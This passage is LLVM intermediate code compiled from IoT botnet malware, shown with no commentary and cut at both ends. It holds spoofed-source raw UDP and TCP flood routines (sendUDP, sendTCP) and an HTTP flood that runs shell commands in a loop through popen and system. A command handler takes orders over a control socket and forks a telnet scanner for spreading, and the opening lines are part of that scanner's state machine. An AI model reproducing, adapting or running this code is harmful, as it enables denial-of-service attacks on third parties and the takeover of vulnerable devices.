  store i32 %544, i32* %540, align 4
  br label %545

; <label>:545:                                    ; preds = %543, %539
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %31, i64 0, i32 0
  %547 = load i32, i32* %546, align 16
  %548 = call i64 @send(i32 %547, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.44, i64 0, i64 0), i64 194, i32 16384) #3
  %549 = icmp slt i64 %548, 0
  br i1 %549, label %550, label %556

; <label>:550:                                    ; preds = %545
  %551 = load i32, i32* %546, align 16
  %552 = call i32 @sclose(i32 %551)
  store i8 0, i8* %32, align 8
  %553 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %553, align 1
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 8
  %555 = load i8*, i8** %554, align 8
  call void @llvm.memset.p0i8.i64(i8* %555, i8 0, i64 1024, i32 1, i1 false)
  br label %565

; <label>:556:                                    ; preds = %545
  %557 = load i32, i32* %540, align 4
  %558 = add i32 %557, 10
  %559 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %560 = icmp ult i32 %558, %559
  br i1 %560, label %561, label %565

; <label>:561:                                    ; preds = %556
  %562 = load i32, i32* %546, align 16
  %563 = call i32 @sclose(i32 %562)
  store i8 0, i8* %32, align 8
  %564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i64 %30, i32 3
  store i8 1, i8* %564, align 1
  br label %565

; <label>:565:                                    ; preds = %.lr.ph, %191, %313, %528, %538, %78, %75, %124, %119, %165, %157, %287, %280, %515, %507, %561, %556, %59, %550, %534, %524, %506, %502, %495, %483, %479, %472, %460, %456, %449, %437, %433, %426, %414, %410, %403, %391, %387, %380, %368, %364, %357, %345, %341, %334, %309, %303, %276, %269, %262, %255, %248, %241, %234, %227, %219, %208, %187, %181, %155, %144, %108, %58
  %566 = add nsw i32 %.1290, 1
  %567 = icmp slt i32 %566, %10
  %.mux = select i1 %567, i32 %566, i32 0
  br label %.lr.ph
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %53

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %32

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @mainCommSock, align 4
  %31 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %30, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i64 0, i64 0))
  br label %.loopexit

; <label>:32:                                     ; preds = %26
  %33 = add nsw i32 %4, 1
  %34 = sext i32 %33 to i64
  %35 = tail call noalias i8* @malloc(i64 %34) #3
  %36 = icmp eq i8* %35, null
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %32
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 %34, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %35, i32 %4)
  %38 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %39 = add nsw i32 %38, %2
  %40 = sext i32 %4 to i64
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %37
  %.058 = phi i32 [ 0, %37 ], [ %.058.be, %.backedge.backedge ]
  %42 = call i64 @sendto(i32 %27, i8* nonnull %35, i64 %40, i32 0, %struct.sockaddr* nonnull %41, i32 16) #3
  %43 = icmp eq i32 %.058, %5
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %.backedge
  br i1 %10, label %45, label %48

; <label>:45:                                     ; preds = %44
  %46 = call i32 @rand_cmwc()
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %18, align 2
  br label %48

; <label>:48:                                     ; preds = %45, %44
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %50 = icmp sgt i32 %49, %39
  br i1 %50, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:51:                                     ; preds = %.backedge
  %52 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %51, %48
  %.058.be = phi i32 [ %52, %51 ], [ 0, %48 ]
  br label %.backedge

; <label>:53:                                     ; preds = %22
  %54 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i64 0, i64 0))
  br label %.loopexit

; <label>:59:                                     ; preds = %53
  store i32 1, i32* %8, align 4
  %60 = bitcast i32* %8 to i8*
  %61 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* nonnull %60, i32 4) #3
  %62 = icmp slt i32 %61, 0
  br i1 %62, label %63, label %.preheader.preheader

.preheader.preheader:                             ; preds = %59
  br label %.preheader

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05962 = phi i32 [ %66, %.preheader ], [ 50, %.preheader.preheader ]
  %66 = add nsw i32 %.05962, -1
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %68 = call i32 @rand_cmwc()
  %69 = xor i32 %68, %67
  call void @srand(i32 %69) #3
  %70 = call i32 @rand() #3
  call void @init_rand(i32 %70)
  %71 = icmp eq i32 %66, 0
  br i1 %71, label %72, label %.preheader

; <label>:72:                                     ; preds = %.preheader
  %73 = icmp eq i32 %3, 0
  %74 = sub nsw i32 32, %3
  %75 = shl i32 -1, %74
  %.060 = select i1 %73, i32 0, i32 %75
  %76 = sext i32 %4 to i64
  %77 = add nsw i64 %76, 28
  %78 = call i8* @llvm.stacksave()
  %79 = alloca i8, i64 %77, align 16
  %80 = bitcast i8* %79 to %struct.iphdr*
  %81 = getelementptr i8, i8* %79, i64 20
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = call i32 @getRandomIP(i32 %.060)
  %85 = call i32 @htonl(i32 %84) #17
  %86 = add nsw i64 %76, 8
  %87 = trunc i64 %86 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %80, i32 %83, i32 %85, i8 zeroext 17, i32 %87)
  %88 = trunc i64 %86 to i16
  %89 = call zeroext i16 @htons(i16 zeroext %88) #17
  %90 = getelementptr inbounds i8, i8* %79, i64 24
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 8
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = bitcast i8* %81 to i16*
  store i16 %93, i16* %94, align 4
  br i1 %10, label %95, label %97

; <label>:95:                                     ; preds = %72
  %96 = call i32 @rand_cmwc()
  br label %101

; <label>:97:                                     ; preds = %72
  %98 = trunc i32 %1 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #17
  %100 = zext i16 %99 to i32
  br label %101

; <label>:101:                                    ; preds = %97, %95
  %.pre-phi = phi i16 [ %98, %97 ], [ 0, %95 ]
  %102 = phi i32 [ %100, %97 ], [ %96, %95 ]
  %103 = trunc i32 %102 to i16
  %104 = getelementptr inbounds i8, i8* %79, i64 22
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = getelementptr inbounds i8, i8* %79, i64 26
  %107 = bitcast i8* %106 to i16*
  store i16 0, i16* %107, align 2
  %108 = getelementptr inbounds i8, i8* %79, i64 28
  call void @makeRandomStr(i8* %108, i32 %4)
  %109 = bitcast i8* %79 to i16*
  %110 = getelementptr inbounds i8, i8* %79, i64 2
  %111 = bitcast i8* %110 to i16*
  %112 = load i16, i16* %111, align 2
  %113 = zext i16 %112 to i32
  %114 = call zeroext i16 @csum(i16* nonnull %109, i32 %113)
  %115 = getelementptr inbounds i8, i8* %79, i64 10
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %118 = add nsw i32 %117, %2
  %119 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %120 = getelementptr inbounds i8, i8* %79, i64 4
  %121 = bitcast i8* %120 to i16*
  %122 = getelementptr inbounds i8, i8* %79, i64 12
  %123 = bitcast i8* %122 to i32*
  br label %.backedge61

.backedge61:                                      ; preds = %.backedge61.backedge, %101
  %.0 = phi i32 [ 0, %101 ], [ %.0.be, %.backedge61.backedge ]
  %124 = call i64 @sendto(i32 %54, i8* nonnull %79, i64 %77, i32 0, %struct.sockaddr* nonnull %119, i32 16) #3
  %125 = call i32 @rand_cmwc()
  %126 = trunc i32 %125 to i16
  store i16 %126, i16* %94, align 4
  br i1 %10, label %127, label %129

; <label>:127:                                    ; preds = %.backedge61
  %128 = call i32 @rand_cmwc()
  br label %132

; <label>:129:                                    ; preds = %.backedge61
  %130 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #17
  %131 = zext i16 %130 to i32
  br label %132

; <label>:132:                                    ; preds = %129, %127
  %133 = phi i32 [ %128, %127 ], [ %131, %129 ]
  %134 = trunc i32 %133 to i16
  store i16 %134, i16* %105, align 2
  %135 = call i32 @rand_cmwc()
  %136 = trunc i32 %135 to i16
  store i16 %136, i16* %121, align 4
  %137 = call i32 @getRandomIP(i32 %.060)
  %138 = call i32 @htonl(i32 %137) #17
  store i32 %138, i32* %123, align 4
  %139 = load i16, i16* %111, align 2
  %140 = zext i16 %139 to i32
  %141 = call zeroext i16 @csum(i16* nonnull %109, i32 %140)
  store i16 %141, i16* %116, align 2
  %142 = icmp eq i32 %.0, %5
  br i1 %142, label %143, label %146

; <label>:143:                                    ; preds = %132
  %144 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %145 = icmp sgt i32 %144, %118
  br i1 %145, label %148, label %.backedge61.backedge

; <label>:146:                                    ; preds = %132
  %147 = add i32 %.0, 1
  br label %.backedge61.backedge

.backedge61.backedge:                             ; preds = %146, %143
  %.0.be = phi i32 [ %147, %146 ], [ 0, %143 ]
  br label %.backedge61

; <label>:148:                                    ; preds = %143
  call void @llvm.stackrestore(i8* %78)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %48
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %17, %32, %148, %63, %56, %29
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #17
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %163

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i64 0, i64 0))
  br label %163

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i64 0, i64 0))
  br label %163

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @getRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #17
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i64 0, i64 0)) #14
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #3
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.49, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.50, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i64 0, i64 0)) #3
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.51, i64 0, i64 0)) #14
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.52, i64 0, i64 0)) #14
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.53, i64 0, i64 0)) #14
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #17
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = add nsw i32 %137, %2
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = getelementptr inbounds i8, i8* %45, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = getelementptr inbounds i8, i8* %45, i64 4
  %143 = bitcast i8* %142 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %144 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %139, i32 16) #3
  %145 = call i32 @getRandomIP(i32 %.065)
  %146 = call i32 @htonl(i32 %145) #17
  store i32 %146, i32* %141, align 4
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %143, align 4
  %149 = call i32 @rand_cmwc()
  store i32 %149, i32* %59, align 8
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %152 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %152, i16* %114, align 4
  %153 = load i16, i16* %131, align 2
  %154 = zext i16 %153 to i32
  %155 = call zeroext i16 @csum(i16* nonnull %129, i32 %154)
  store i16 %155, i16* %136, align 2
  %156 = icmp eq i32 %.0, %6
  br i1 %156, label %157, label %160

; <label>:157:                                    ; preds = %.backedge
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %159 = icmp sgt i32 %158, %138
  br i1 %159, label %162, label %.backedge.backedge

; <label>:160:                                    ; preds = %.backedge
  %161 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %160, %157
  %.0.be = phi i32 [ %161, %160 ], [ 0, %157 ]
  br label %.backedge

; <label>:162:                                    ; preds = %157
  call void @llvm.stackrestore(i8* %44)
  br label %163

; <label>:163:                                    ; preds = %18, %162, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8* nocapture readonly, i32) local_unnamed_addr #1 {
  %3 = alloca [80 x i8], align 16
  %4 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %5 = add nsw i32 %4, %1
  %6 = getelementptr inbounds [80 x i8], [80 x i8]* %3, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %6, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.55, i64 0, i64 0), i64 17, i32 1, i1 false)
  %7 = call i8* @strcat(i8* nonnull %6, i8* %0) #3
  %strlen = call i64 @strlen(i8* nonnull %6)
  %endptr = getelementptr [80 x i8], [80 x i8]* %3, i64 0, i64 %strlen
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %endptr, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i64 0, i64 0), i64 14, i32 1, i1 false)
  %8 = call %struct._IO_FILE* @popen(i8* nonnull %6, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.57, i64 0, i64 0))
  %9 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %10 = icmp sgt i32 %5, %9
  br i1 %10, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = call i32 @system(i8* nonnull %6) #3
  %12 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %13 = icmp sgt i32 %5, %12
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @popen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.58, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i64 0, i64 0))
  br label %103

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i64 0, i64 0)) #14
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #3
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.61, i64 0, i64 0), i8* %15)
  br label %103

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i64 0, i64 0)) #14
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %103

; <label>:20:                                     ; preds = %17
  %21 = icmp eq i32 %0, 2
  br i1 %21, label %25, label %22

; <label>:22:                                     ; preds = %20
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.63, i64 0, i64 0))
  br label %103

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds i8*, i8** %1, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = tail call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i64 0, i64 0)) #14
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %58

; <label>:30:                                     ; preds = %25
  %31 = load i32, i32* @scanPid, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %103, label %33

; <label>:33:                                     ; preds = %30
  %34 = load i32, i32* @mainCommSock, align 4
  %35 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %34, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.65, i64 0, i64 0))
  %36 = load i32, i32* @scanPid, align 4
  %37 = tail call i32 @kill(i32 %36, i32 9) #3
  store i32 0, i32* @scanPid, align 4
  %38 = load i8*, i8** %26, align 8
  %39 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.66, i64 0, i64 0)) #14
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %48

; <label>:41:                                     ; preds = %33
  %42 = tail call i32 @fork() #3
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %43, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.67, i64 0, i64 0))
  %45 = icmp eq i32 %42, 0
  br i1 %45, label %47, label %46

; <label>:46:                                     ; preds = %41
  store i32 %42, i32* @scanPid, align 4
  br label %103

; <label>:47:                                     ; preds = %41
  tail call void @TelnetScan() #3
  unreachable

